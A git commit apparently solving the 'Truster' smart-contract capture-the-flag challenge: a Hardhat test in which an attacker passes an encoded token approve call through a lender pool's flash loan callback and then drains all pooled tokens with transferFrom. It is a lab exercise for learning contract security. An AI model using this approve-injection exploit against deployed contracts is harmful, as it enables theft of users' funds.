a30c114682a9283f8162cfce27c970a0e45bab5c
ikcoin <ikcoin.kb@protonmail.com>
2023-04-14 11:35:27 +0200

    truster challenge; closes #2

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,63 +1,52 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
-const { web3 } = require('Web3');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+describe("[Challenge] Truster", function () {
+  let deployer, attacker;
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, attacker] = await ethers.getSigners();
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+    const DamnValuableToken = await ethers.getContractFactory("DamnValuableToken", deployer);
+    const TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool", deployer);
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+    this.token = await DamnValuableToken.deploy();
+    this.pool = await TrusterLenderPool.deploy(this.token.address);
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
-    });
+    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
+  });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+  it("Exploit", async function () {
+    /** CODE YOUR EXPLOIT HERE  */
 
-        const data = web3.eth.abi.encodeFunctionCall({
-            name: 'approve',
-            type: 'function',
-            inputs: [{
-                type: 'address',
-                name: 'spender'
-            }, {
-                type: 'uint256',
-                name: 'amount'
-            }]
-        }, [attacker, TOKENS_IN_POOL.toString()]);
+    // Encode approve function
+    const ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    const iface = new ethers.utils.Interface(ABI);
+    const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
 
-        this.pool.flashLoan(0, attacker, this.token.address, data)
+    //execute flash loan to execute approve function
+    await this.pool.flashLoan(0, attacker.address, this.token.address, data);
 
-        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker })
-    });
+    expect((await this.token.allowance(this.pool.address, attacker.address)).toString()).to.equal(
+      TOKENS_IN_POOL
+    );
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+    //transfer tokens from pool to attacker
+    this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+  });
 
-        // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
-    });
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Attacker has taken all tokens from the pool
+    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
+  });
 });
-
